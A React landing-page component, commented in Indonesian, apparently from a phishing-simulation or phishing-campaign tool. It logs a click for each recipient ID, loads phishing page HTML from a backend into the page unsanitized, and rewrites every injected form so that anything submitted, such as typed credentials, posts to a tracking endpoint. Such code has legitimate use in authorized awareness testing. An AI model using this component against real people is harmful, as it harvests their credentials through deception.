import { useEffect, useState } from 'react'

export default function Lander() {
  const qs     = new URLSearchParams(window.location.search)
  const rid    = qs.get('rid')    || ''
  const camp  = qs.get('campaign') || ''
  const page  = qs.get('page')    || ''

  const [body,    setBody]    = useState<string>('')
  const [loading, setLoading] = useState<boolean>(true)
  const [error,   setError]   = useState<string | null>(null)

  // Baca base URL API dari env
  const API = import.meta.env.VITE_API_URL_UNAUTHORIZED as string

  useEffect(() => {
    if (!rid || !camp || !page) {
      setError('Missing tracking parameters')
      setLoading(false)
      return
    }

    // 1. Catat event "opened" sekali ketika halaman dimuat
    fetch(`${API}/track/click?rid=${rid}&campaign=${camp}`)
      .catch(err => console.error('Open tracking failed:', err))

    // 2. Ambil HTML landing page dari backend
    fetch(`${API}/landing-page/${page}/body?rid=${rid}&campaign=${camp}`)
      .then(res => {
        if (!res.ok) throw new Error('Failed to load landing page')
        return res.json()
      })
      .then(data => {
        setBody(data.body)
      })
      .catch(err => {
        console.error(err)
        setError('Gagal memuat halaman phishing')
      })
      .finally(() => setLoading(false))

    // 3. Pasang atribut action + method pada semua <form> yang di-inject
    //    sehingga submit otomatis tercatat di /track/submit
    const observer = new MutationObserver(() => {
      const forms = document.querySelectorAll<HTMLFormElement>('form:not([data-tracked])')
      
      forms.forEach(form => {
        form.setAttribute('action', `${API}/track/submit?rid=${rid}&campaign=${camp}`)
        form.setAttribute('method', 'POST')
        form.setAttribute('data-tracked', 'true')
      })
    })

    observer.observe(document.body, { childList: true, subtree: true })
    return () => observer.disconnect()
  }, [rid, camp, page, API])

  if (loading) return <div>Loading…</div>
  if (error)   return <div>{error}</div>

  return (
    <div
      className="lander-body"
      dangerouslySetInnerHTML={{ __html: body }}
    />
  )
}
